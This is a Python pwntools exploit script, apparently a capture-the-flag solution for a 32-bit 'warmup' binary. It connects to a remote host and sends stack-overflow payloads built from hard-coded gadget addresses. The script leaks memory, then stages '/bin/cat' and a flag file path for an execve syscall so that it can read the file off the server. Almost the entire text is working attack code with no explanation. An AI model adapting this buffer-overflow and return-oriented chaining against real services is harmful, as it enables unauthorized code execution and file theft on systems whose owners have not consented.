from pwn import *
import sys

#p = process("./warmup")
p = remote('202.120.7.207', 52608)

read_address = 0x804811D
write_address = 0x8048135
main_address = 0x804815A
buf_address = 0x80491D3
gadget_address = 0x804813A

start_address = 0x80480d8

# mov ebx, [esp+4]; mov ecx, [esp+8]; mov edx, [esp+len]; int 80;

def read_and_back (size, msg):
  payload = "A" * 32
  payload += p32 (read_address)
  payload += p32 (main_address)
  payload += p32 (0) # fd of stdin
  payload += p32 (buf_address) # read buf
  payload += p32 (size) # size

  p.send (payload)

  log.info (p.recvuntil ("Luck!\n"))
  p.send (msg)

def memleak_and_back (addr):
  payload = "A" * 32
  payload += p32 (write_address)
  payload += p32 (start_address)
  payload += p32 (1)
  payload += p32 (addr)
  payload += p32 (4)

  p.send (payload)

  log.info (p.recvuntil ("Luck!\n"))
  recved = p.recvuntil ("2016!\n")
  log.info (recved)

  log.info ("Addr " + hex (addr) + ": 0x" + recved[:4].encode ("hex"))

log.info(p.recvuntil("2016!\n"))

memleak_and_back (0x80491d3)

payload2 = "/bin/cat"
payload2 += p32 (0)

flag_offset = len (payload2)

payload2 += "/home/ebmoon/flag\x00\x00\x00"
#payload2 += "/home/warmup/flag\x00\x00\x00"
payload2 += p32 (0)

array_offset = len (payload2)

payload2 += p32 (buf_address)
payload2 += p32 (buf_address + flag_offset)
payload2 += p32 (0)

read_and_back (48, payload2)

# ---------------------

payload3 = "B" * 32
payload3 += p32 (read_address)
payload3 += p32 (gadget_address)
payload3 += p32 (0) # fd of stdin
payload3 += p32 (buf_address)
payload3 += p32 (buf_address + array_offset)

p.send (payload3)

p.send ("/bin/cat\x00\x00\x00")

"""
read_and_back (48, "/bin/cat\x00\x00\x00")

payload4 = "C" * 32
payload4 += p32 (gadget_address)
payload4 += p32 (main_address)
payload4 += p32 (buf_address) # fd of stdin
payload4 += p32 (buf_address + array_offset)
payload4 += p32 (0)

#log.info(p.recvuntil("Luck!\n"))
#p.send (payload4)
"""

log.info(p.recvall())

p.close ()
